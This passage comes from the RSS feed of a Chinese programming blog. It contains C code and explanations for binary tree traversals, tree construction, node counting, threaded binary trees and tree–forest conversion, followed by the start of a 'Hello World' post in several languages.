class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrderTraverse</span><span class="params">(BTree T)</span> <span class="comment">//前序遍历</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, T-&gt;data); <span class="comment">//显示结点数据</span></span><br><span class="line">PreOrderTraverse(T-&gt;lchild); <span class="comment">//先序遍历左子树</span></span><br><span class="line">PreOrderTraverse(T-&gt;rchild); <span class="comment">//先序遍历右子树</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>先序遍历输出为：<code>ABDGHCEIF</code></p><h4 id="中序遍历（LDR）"><a href="#中序遍历（LDR）" class="headerlink" title="中序遍历（LDR）"></a>中序遍历（LDR）</h4><h5 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h5><p><strong>若二叉树为空，遍历结束，否则依次执行以下操作：</strong></p><p><strong>1、中序遍历根结点的左子树</strong></p><p><strong>2、访问根结点</strong></p><p><strong>3、中序遍历根结点的右子树</strong></p><h5 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BTree T)</span> <span class="comment">//中序遍历</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line">InOrderTraverse(T-&gt;lchild); <span class="comment">//中序遍历左子树</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, T-&gt;data); <span class="comment">//显示结点数据</span></span><br><span class="line">InOrderTraverse(T-&gt;rchild); <span class="comment">//中序遍历右子树</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h5><p>中序遍历输出为：<code>BGDHAEICF</code></p><h4 id="后序遍历（LRD）"><a href="#后序遍历（LRD）" class="headerlink" title="后序遍历（LRD）"></a>后序遍历（LRD）</h4><h5 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h5><p><strong>若二叉树为空，遍历结束，否则依次执行以下操作：</strong></p><p><strong>1、后序遍历根结点的左子树</strong></p><p><strong>2、后序遍历根结点的右子树</strong></p><p><strong>3、访问根结点</strong> </p><h5 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(BTree T)</span> <span class="comment">//后序遍历</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line">PostOrderTraverse(T-&gt;lchild); <span class="comment">//后序遍历左子树</span></span><br><span class="line">PostOrderTraverse(T-&gt;rchild); <span class="comment">//后序遍历右子树</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, T-&gt;data); <span class="comment">//显示结点数据</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h5><p>后序遍历输出为：<code>GHDBIEFCA</code></p><h4 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h4><h5 id="操作-3"><a href="#操作-3" class="headerlink" title="操作"></a>操作</h5><p><strong>若二叉树为空，遍历结束，否则从树的第一层，也就是根结点开始访问，从上而下逐层遍历，在同一层中，按从左到右的顺序对结点逐个访问；</strong></p><h5 id="算法-3"><a href="#算法-3" class="headerlink" title="算法"></a>算法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LevelOrderTraverse</span><span class="params">(BTree T)</span> <span class="comment">//层序遍历</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> front, rear; <span class="comment">//定义队头队尾指针</span></span><br><span class="line">BTree p, q[MAX]; <span class="comment">//定义循环队列，存放结点指针</span></span><br><span class="line">p = T;</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>) <span class="comment">//若二叉树为空，则根结点地址入队</span></span><br><span class="line">{</span><br><span class="line">front = <span class="number">1</span>;</span><br><span class="line">q[front] = p;</span><br><span class="line">rear = <span class="number">2</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span> (front != rear) <span class="comment">//队列不为空</span></span><br><span class="line">{</span><br><span class="line">p = q[front];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data); <span class="comment">//访问队首结点的数据域</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;lchild != <span class="literal">NULL</span>) <span class="comment">//将队首结点的左孩子入列</span></span><br><span class="line">{</span><br><span class="line">q[rear] = p-&gt;lchild;</span><br><span class="line">rear = (rear + <span class="number">1</span>) % MAX;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (p-&gt;rchild != <span class="literal">NULL</span>) <span class="comment">//将队首结点的右孩子入列</span></span><br><span class="line">{</span><br><span class="line">q[rear] = p-&gt;rchild;</span><br><span class="line">rear = (rear + <span class="number">1</span>) % MAX;</span><br><span class="line">}</span><br><span class="line">front = (front + <span class="number">1</span>) % MAX;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h5><p>层序遍历的输出为：<code>ABCDEFGHI</code></p><h3 id="二叉树的建立"><a href="#二叉树的建立" class="headerlink" title="二叉树的建立"></a>二叉树的建立</h3><h4 id="特殊处理"><a href="#特殊处理" class="headerlink" title="特殊处理"></a>特殊处理</h4><p>为了让树的每个结点确认是否有左右孩子，我们对它进行了扩展，将空结点赋值 “#” ，我们成这种处理后的二叉树为原二叉树的扩展二叉树，所以就会得到类似于“AB##C#D###”的序列；</p><p>算法</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBTree</span><span class="params">(BTree* T)</span> <span class="comment">//建立二叉树</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">DataType ch;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;ch);</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">'#'</span>)</span><br><span class="line">{</span><br><span class="line">*T = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">*T = (BTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BTNode));</span><br><span class="line"><span class="keyword">if</span> (!*T)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line">(*T)-&gt;data = ch; <span class="comment">//生成根结点</span></span><br><span class="line">CreateBTree(&amp;(*T)-&gt;lchild); <span class="comment">//构造左子树</span></span><br><span class="line">CreateBTree(&amp;(*T)-&gt;rchild); <span class="comment">//构造右子树</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="统计二叉树叶子结点的数目"><a href="#统计二叉树叶子结点的数目" class="headerlink" title="统计二叉树叶子结点的数目"></a>统计二叉树叶子结点的数目</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Leafnodenum</span><span class="params">(BTree T)</span> <span class="comment">//统计二叉树叶子结点的数目</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (T-&gt;lchild == <span class="literal">NULL</span> &amp;&amp; T-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">count1++; <span class="comment">//全局变量计数，初始化为0</span></span><br><span class="line">}</span><br><span class="line">Leafnodenum(T-&gt;lchild); <span class="comment">//递归统计左子树叶子结点的数量</span></span><br><span class="line">Leafnodenum(T-&gt;rchild); <span class="comment">//递归统计右子树叶子结点的数量</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="统计二叉树结点总数"><a href="#统计二叉树结点总数" class="headerlink" title="统计二叉树结点总数"></a>统计二叉树结点总数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Nodetotalnum</span><span class="params">(BTree T)</span> <span class="comment">//统计二叉树结点总数</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T)</span><br><span class="line">{</span><br><span class="line">count2++; <span class="comment">//全局变量计数，初始化为0</span></span><br><span class="line">Nodetotalnum(T-&gt;lchild); <span class="comment">//递归统计左子树结点数</span></span><br><span class="line">Nodetotalnum(T-&gt;rchild); <span class="comment">//递归统计右子树结点数</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="求二叉树的深度"><a href="#求二叉树的深度" class="headerlink" title="求二叉树的深度"></a>求二叉树的深度</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">TreeDepth</span><span class="params">(BTree T)</span> <span class="comment">//求二叉树的深度</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span>  ldep, rdep; <span class="comment">//定义两个整型变量，用以存放左、右子树的深度</span></span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">ldep = TreeDepth(T-&gt;lchild); <span class="comment">//递归统计左子树深度</span></span><br><span class="line">rdep = TreeDepth(T-&gt;rchild); <span class="comment">//递归统计右子树深度</span></span><br><span class="line"><span class="keyword">if</span> (ldep &gt; rdep)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> ldep + <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> rdep + <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p><strong>对于一个有n个结点的二叉链表，每个结点有指向左右孩子的两个指针域，所以一共是2n个指针域，而n个结点的</strong></p><p><strong>二叉树一共有n-1条分支线数，也就是说，其实是存在2n-(n-1) = n+1个空指针域，这些空间不存储任何事物，白</strong></p><p><strong>白地浪费内存资源；因此，提出一种方法，利用原来的空指针域存放指针，指向树中其他结点；</strong></p><h3 id="定义-13"><a href="#定义-13" class="headerlink" title="定义"></a>定义</h3><p><strong>二叉树中所有空指针域的lchild，改为指向当前结点的前驱，把空指针域中的rchild，改为指向结点的后继；</strong></p><p><strong>我们把指向前驱和后继的指针叫做线索 ，加上线索的二叉树就称之为线索二叉树。</strong></p><h3 id="线索化"><a href="#线索化" class="headerlink" title="线索化"></a>线索化</h3><p><strong>我们对二叉树以某种次序遍历使其变为线索二叉树的过程称作是线索化；</strong></p><h3 id="存储结构-2"><a href="#存储结构-2" class="headerlink" title="存储结构"></a>存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span>  <span class="comment">//这个是一个枚举类型</span></span><br><span class="line">{</span><br><span class="line">Link,Thread <span class="comment">//Link=0表示指向左右孩子指针，Thread表示指向前驱或后继的线索</span></span><br><span class="line">}PointerTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BThrTreeNode</span> //二叉线索存储结点结构</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data; <span class="comment">//结点数据</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BThrTreeNode</span>* <span class="title">lchild</span>, * <span class="title">rchild</span>;</span> <span class="comment">//左右孩子指针</span></span><br><span class="line">PointerTag L_Tag; <span class="comment">//左右标志</span></span><br><span class="line">PointerTag R_Tag; <span class="comment">//左右标志</span></span><br><span class="line">}BThrTreeNode, * BThrTree;</span><br></pre></td></tr></tbody></table></figure><p>所以线索化的过程就是在遍历的过程中修改空指针的过程=_=</p><h3 id="中序遍历线索化"><a href="#中序遍历线索化" class="headerlink" title="中序遍历线索化"></a>中序遍历线索化</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BThrTree pre; <span class="comment">//全局变量，始终指向刚刚访问过的结点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InThreading</span><span class="params">(BThrTree p)</span> <span class="comment">//中序遍历进行中序线索化</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (p)</span><br><span class="line">{</span><br><span class="line">InThreading(p-&gt;lchild); <span class="comment">//递归左子树线索化</span></span><br><span class="line"><span class="keyword">if</span> (!p-&gt;lchild) <span class="comment">//没有左孩子</span></span><br><span class="line">{</span><br><span class="line">p-&gt;L_Tag = Thread; <span class="comment">//前驱线索</span></span><br><span class="line">p-&gt;lchild = pre; <span class="comment">//左孩子指针指向前驱</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (!pre-&gt;rchild) <span class="comment">//前驱没有右孩子</span></span><br><span class="line">{</span><br><span class="line">pre-&gt;R_Tag = Thread; <span class="comment">//后继线索</span></span><br><span class="line">pre-&gt;rchild = p; <span class="comment">//前驱右孩子指针指向后继（当前结点p）</span></span><br><span class="line">}</span><br><span class="line">pre = p; <span class="comment">//保持pre指向p的前驱</span></span><br><span class="line">InThreading(p-&gt;rchild); <span class="comment">//递归右子树线索化</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="中序遍历线索二叉树"><a href="#中序遍历线索二叉树" class="headerlink" title="中序遍历线索二叉树"></a>中序遍历线索二叉树</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//T指向头结点，头结点左链lchild指向根结点，头结点右链rchild指向中序遍历的最后一个结点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InOrderTraverse_Thr</span><span class="params">(BThrTree T)</span> <span class="comment">//中序遍历二叉线索链表表示的二叉树</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">BThrTree p;</span><br><span class="line">p = T-&gt;lchild; <span class="comment">//p指向根结点</span></span><br><span class="line"><span class="keyword">while</span> (p != T) <span class="comment">//空树或者遍历结束时，p==T</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">while</span> (p-&gt;L_Tag == Link) <span class="comment">//当L_Tag==0时循环到中序序列第一个结点</span></span><br><span class="line">{</span><br><span class="line">p = p-&gt;lchild;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data); <span class="comment">//显示结点数据，可以更改为其他对结点操作</span></span><br><span class="line"><span class="keyword">while</span> (p-&gt;R_Tag == Thread &amp;&amp; p-&gt;rchild != T)</span><br><span class="line">{</span><br><span class="line">p = p-&gt;rchild;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data);</span><br><span class="line">}</span><br><span class="line">p = p-&gt;rchild; <span class="comment">//p进至其右子树根</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="树、森林与二叉树的转换"><a href="#树、森林与二叉树的转换" class="headerlink" title="树、森林与二叉树的转换"></a>树、森林与二叉树的转换</h2><p>前面已经见过树的定义和存储结构，对于树来讲，可以是任意形状，一个结点可以有很多孩子，复杂很多，于是引</p><p>入了二叉树，这个就方便很多了；二叉树只有左右两个孩子，这样的话，面对的变化就少了，如果所有的树都能变</p><p>成二叉树就好了😅别说，还真可以：</p><h3 id="树转换为二叉树"><a href="#树转换为二叉树" class="headerlink" title="树转换为二叉树"></a>树转换为二叉树</h3><p>一般来讲，树转换为二叉树有以下几步：</p><p>1、加线：在所有兄弟结点之间加一条线；</p><p>2、去线：对树中的每个结点，只保留它与第一个孩子结点之间的连线，删除它与其他孩子结点之间的连线；</p><p>3、旋转：以树的根节点为轴心，将整棵树顺时针旋转45°，使之成为二叉树；</p><p><strong>如图所示：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%A0%91%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="树转换为二叉树"></p><h3 id="森林转换为二叉树"><a href="#森林转换为二叉树" class="headerlink" title="森林转换为二叉树"></a>森林转换为二叉树</h3><p>森林是由若干棵树组成的，所以完全可以理解为，森林中的每一棵树都是兄弟，可以按照兄弟的处理办法来操作，方法如下：</p><p>1、把每棵树转换成二叉树；</p><p>2、第一棵二叉树不动，从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵树的根结点的右孩子，用</p><p>线连接起来，当所有的二叉树连接起来后就得到了由森林转换来的二叉树；</p><p><strong>如图所示：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%A3%AE%E6%9E%97%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="森林转换为二叉树"></p><h3 id="二叉树还原为树"><a href="#二叉树还原为树" class="headerlink" title="二叉树还原为树"></a>二叉树还原为树</h3><p>二叉树还原为树就是树转换为二叉树的逆过程，直接反过来做就可以</p><p>步骤如下：</p><p>1、加线：若某结点的左孩子结点存在，则将这个左孩子的右孩子结点，右孩子的右孩子结点，右孩子的右孩子的</p><p>右孩子结点….哈哈，就是左孩子的n个右孩子结点都作为结点的孩子，将该结点与这些右孩子结点用线连接起来；</p><p>2、去线：删除原二叉树中所有结点与其右孩子结点的连线；</p><p>3、旋转：旋转得到树</p><p><strong>如图所示：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%98%E5%8E%9F%E4%B8%BA%E6%A0%91.png" alt="二叉树还原为树"></p><h3 id="二叉树还原为森林"><a href="#二叉树还原为森林" class="headerlink" title="二叉树还原为森林"></a>二叉树还原为森林</h3><p>判断一棵二叉树能够转换成树还是森林，很简单，只要看这棵二叉树的根结点有没有右孩子，有就是森林，没有就</p><p>是一棵树，如果是森林，步骤如下：</p><p>1、从根结点开始，若右孩子存在，则把它与右孩子结点的连线删除，再查看分离后的二叉树，若右孩子存在，则</p><p>连线删除……，直到所有右孩子连线都删除为止，得到分离的二叉树；</p><p>2、再将每棵分离后的二叉树转换为树即可；</p><p><strong>如图所示：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%98%E5%8E%9F%E4%B8%BA%E6%A3%AE%E6%9E%97.png" alt="二叉树还原为森林"></p><h2 id="二叉树应用"><a href="#二叉树应用" class="headerlink" title="二叉树应用"></a>二叉树应用</h2><p><strong><em>赫夫曼树</em></strong></p><p><strong><em>赫夫曼编码</em></strong></p><h2 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h2><p>这一章讲的是树🌳，重点学习了二叉树，要牢牢掌握其算法，再了解一下它的应用</p><p>emm 下一章讲 “图” ，这个是一点没有接触过的内容了😀</p><p>.</p><p>.</p><p>.</p><p><strong>end</strong>  </p><p><strong>goodbye~</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/shujujiegou/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hello World</title>
      <link>https://www.los-kos.cn/posts/hello-world/</link>
      <guid>https://www.los-kos.cn/posts/hello-world/</guid>
      <pubDate>Fri, 14 Feb 2020 06:00:00 GMT</pubDate>
      <description>
      
        第一篇博客，当做是一个test咯
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>Welcome to Hexo！！</p><p>我是一名计算机小白，这是我的第一篇博客，不足之处，请多指教；</p><p>学习语言最基本了解它大概长什么样子，下面通过打印Hello World！来了解了解；</p><a id="more"></a><h4 id="打印”Hello-World-”"><a href="#打印”Hello-World-”" class="headerlink" title="打印”Hello World!”"></a>打印”Hello World!”</h4><h5 id="C"><a href="#C" class="headerlink" title="C"></a>C</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello World!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h5><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        System.out.println(<span class="string">"Hello World!"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Hello World!"</span>);</span><br></pre></td></tr></tbody></table></figure><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello World!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><h5 id="C-2"><a href="#C-2" class="headerlink" title="C#"></a>C#</h5><figure class="highlight c#"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">HelloWorld</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">class</span> <span class="title">HelloWorld</span></span><br><span class="line">    {</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span>{</span><br><span class="line">            Console.WriteLine(<span 